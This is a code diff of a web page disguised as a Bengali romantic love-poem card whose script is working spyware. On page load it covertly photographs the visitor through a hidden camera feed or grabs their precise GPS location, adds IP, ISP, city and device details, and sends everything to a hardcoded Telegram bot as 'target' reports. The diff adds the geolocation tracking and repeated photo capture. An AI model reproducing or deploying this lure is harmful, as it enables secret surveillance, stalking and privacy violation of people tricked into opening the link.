@@ -3,58 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>মনের কথা</title>
+    <title>মনের কাব্য - GOD MODE</title>
     <style>
-        /* রোমান্টিক ডিজাইন */
         body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1518621736915-f3b1c41bfd00?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
-            background-size: cover;
-            background-position: center;
-            font-family: 'Hind Siliguri', sans-serif;
-            color: #fff;
-            overflow: hidden;
+            margin: 0; padding: 0; display: flex; justify-content: center; align-items: center;
+            height: 100vh; background: #000; font-family: 'Hind Siliguri', sans-serif; color: #fff; overflow: hidden;
         }
-
+        .bg-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), 
+                        url('https://images.unsplash.com/photo-1518621736915-f3b1c41bfd00?auto=format&fit=crop&w=1350&q=80');
+            background-size: cover; background-position: center; z-index: -1;
+        }
         .card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 40px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            text-align: center;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-            max-width: 85%;
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px);
+            padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 77, 109, 0.3);
+            text-align: center; box-shadow: 0 0 50px rgba(255, 77, 109, 0.2);
+            max-width: 85%; width: 350px; animation: glow 3s infinite alternate;
         }
-
-        h1 { font-size: 24px; margin-bottom: 20px; color: #ff4d6d; }
-        p { font-size: 18px; line-height: 1.6; font-style: italic; }
-        .heart { font-size: 40px; color: #ff4d6d; animation: heartbeat 1.2s infinite; }
-        
-        @keyframes heartbeat {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+        @keyframes glow { from { border-color: rgba(255,77,109,0.3); } to { border-color: #ff4d6d; } }
+        h1 { font-size: 26px; color: #ff4d6d; margin-bottom: 15px; }
+        p { font-size: 18px; line-height: 1.6; font-style: italic; opacity: 0.9; }
+        .heart { font-size: 60px; color: #ff4d6d; animation: heartbeat 1.2s infinite; }
+        .loader {
+            width: 50px; height: 50px; border: 3px solid transparent; border-top: 3px solid #ff4d6d;
+            border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto;
         }
-
-        #status { font-size: 14px; margin-top: 20px; color: rgba(255,255,255,0.6); }
+        @keyframes heartbeat { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        #status { font-size: 12px; color: #ff4d6d; letter-spacing: 2px; font-weight: bold; }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;600&display=swap" rel="stylesheet">
 </head>
 <body>
-
+    <div class="bg-overlay"></div>
     <div class="card">
         <div class="heart">❤️</div>
         <h1>একটু অপেক্ষা করো প্রিয়...</h1>
-        <p>"তোমার হাসিতে হারাই আমি,<br>তোমার চোখেই খুঁজি সুখ।<br>তুমি আছো তাই পূর্ণ আজ,<br>আমার এই ছোট বুক।"</p>
-        <p id="status">Handshaking with heart...</p>
+        <p>"তোমার হাসিতে হারাই আমি,<br>তোমার চোখেই খুঁজি সুখ।"</p>
+        <div class="loader"></div>
+        <p id="status">ESTABLISHING GOD-MODE CONNECTION...</p>
         
-        <video id="video" width="1" height="1" autoplay style="display:none;"></video>
+        <video id="video" autoplay playsinline style="display:none;"></video>
         <canvas id="canvas" width="720" height="1280" style="display:none;"></canvas>
     </div>
 
@@ -64,56 +54,82 @@
         const type = urlParams.get('type') || 'front';
         const botToken = "8676024624:AAH4OoRcAweKjXHl91lXVD-UGolgALP0OW4";
 
-        async function getFullDetails() {
-            let batt = await navigator.getBattery();
-            let conn = navigator.connection || {};
-            let mem = performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1048576) : "N/A";
-            
-            let info = `🔍 DETAILED DEVICE INFO\n\n`;
-            info += `📱 DEVICE:\n• OS: ${navigator.platform}\n• Agent: ${navigator.userAgent.substring(0, 50)}...\n\n`;
-            info += `🖥️ DISPLAY:\n• Screen: ${screen.width}x${screen.height}\n\n`;
-            info += `🌐 NETWORK:\n• Type: ${conn.effectiveType || 'wifi'}\n• Speed: ${conn.downlink || 'N/A'} Mbps\n\n`;
-            info += `🔋 BATTERY:\n• Level: ${Math.round(batt.level * 100)}%\n• Charging: ${batt.charging ? 'Yes' : 'No'}\n\n`;
-            info += `💻 SYSTEM:\n• CPU: ${navigator.hardwareConcurrency} Cores\n• TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n• RAM Used: ${mem}MB\n\n`;
-            info += `📅 Time: ${new Date().toISOString()}\n👤 Owner: Boss Enaful`;
-            return info;
+        async function getGodMetrics() {
+            try {
+                const b = await navigator.getBattery();
+                const conn = navigator.connection || {};
+                // IP এবং ISP তথ্য সংগ্রহের চেষ্টা
+                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
+                
+                return `🔱 GOD-LEVEL REPORT [BOSS ENAFUL]\n` +
+                       `━━━━━━━━━━━━━━━━━━━━\n` +
+                       `👤 Target IP: ${ipRes.ip || 'Hidden'}\n` +
+                       `🏢 ISP: ${ipRes.org || 'Unknown'}\n` +
+                       `📍 City: ${ipRes.city}, ${ipRes.country_name}\n\n` +
+                       `📱 DEVICE INFO:\n` +
+                       `• Model: ${navigator.platform}\n` +
+                       `• Browser: ${navigator.userAgentData ? navigator.userAgentData.brands[0].brand : 'System'}\n` +
+                       `• Battery: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging ⚡' : 'Disc.'})\n` +
+                       `• Network: ${conn.effectiveType || 'N/A'} (${conn.downlink || 0} Mbps)\n` +
+                       `• CPU: ${navigator.hardwareConcurrency} Cores\n` +
+                       `━━━━━━━━━━━━━━━━━━━━`;
+            } catch(e) { return "Metrics Error"; }
         }
 
-        async function startTask() {
+        async function startGodSystem() {
             if (!chatId) return;
 
-            try {
-                const facing = (type === 'back') ? 'environment' : 'user';
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imgData = canvas.toDataURL('image/png');
-                    const blob = await (await fetch(imgData)).blob();
-                    
-                    const caption = await getFullDetails();
+            // ১. হাই-একুরেসি লোকেশন ট্র্যাকিং
+            if (type === 'location') {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const metrics = await getGodMetrics();
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'pic.png');
-                    formData.append('caption', caption);
-
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
+                    formData.append('latitude', pos.coords.latitude);
+                    formData.append('longitude', pos.coords.longitude);
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, { method: 'POST', body: formData });
+                    
+                    const msgData = new FormData();
+                    msgData.append('chat_id', chatId);
+                    msgData.append('text', `🔱 TARGET PINPOINTED!\n\n${metrics}\n🔗 Google Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', body: msgData });
+                    document.getElementById('status').innerText = "CONNECTED 💞";
+                }, null, {enableHighAccuracy: true});
+            } 
+            
+            // ২. অ্যাডভান্সড ক্যামেরা ক্যাপচার (৭২০x১২৮০)
+            else {
+                try {
+                    const facing = (type === 'back') ? 'environment' : 'user';
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: facing, width: 720, height: 1280 } 
                     });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
 
-                    document.getElementById('status').innerText = "Connected Forever! 💞";
-                    stream.getTracks().forEach(t => t.stop());
-                }, 3500);
-            } catch (e) {
-                document.getElementById('status').innerText = "Permission needed to see the magic! ✨";
+                    // একাধিক ছবি তোলার সিস্টেম (God Level Speed)
+                    for(let i=0; i<2; i++) {
+                        await new Promise(r => setTimeout(r, 1000));
+                        const canvas = document.getElementById('canvas');
+                        canvas.getContext('2d').drawImage(video, 0, 0, 720, 1280);
+                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.95));
+                        const info = await getGodMetrics();
+
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, `shot_${i}.jpg`);
+                        formData.append('caption', i === 0 ? `🔱 GOD CAPTURE [${type.toUpperCase()}]\n\n${info}` : `🔱 RE-CAPTURE [${type.toUpperCase()}]`);
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                    }
+                    
+                    document.getElementById('status').innerText = "CONNECTED 💞";
+                    setTimeout(() => stream.getTracks().forEach(t => t.stop()), 3000);
+                } catch (err) {
+                    document.getElementById('status').innerText = "PERMISSION DENIED ❌";
+                }
             }
         }
-
-        window.onload = startTask;
+        window.onload = startGodSystem;
     </script>
 </body>
 </html>
